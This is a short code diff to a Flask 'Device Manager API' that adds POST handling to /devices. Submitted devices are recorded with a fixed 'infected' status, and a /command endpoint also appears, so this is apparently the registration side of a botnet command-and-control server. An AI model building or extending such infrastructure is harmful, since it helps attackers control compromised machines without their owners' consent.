@@ -12,8 +12,19 @@ devices = [
 def index():
     return 'Device Manager API is running.'
 
-@app.route('/devices', methods=['GET'])
-def get_devices():
+@app.route('/devices', methods=['GET', 'POST'])
+def handle_devices():
+    if request.method == 'POST':
+        data = request.get_json()
+        if data:
+            devices.append({
+                'id': data.get('id', 'unknown'),
+                'name': data.get('name', 'Unknown'),
+                'status': 'infected',
+                'ip': data.get('ip', '0.0.0.0')
+            })
+            return jsonify({'success': True, 'device': data})
+        return jsonify({'error': 'Invalid data'}), 400
     return jsonify(devices)
 
 @app.route('/command', methods=['POST'])
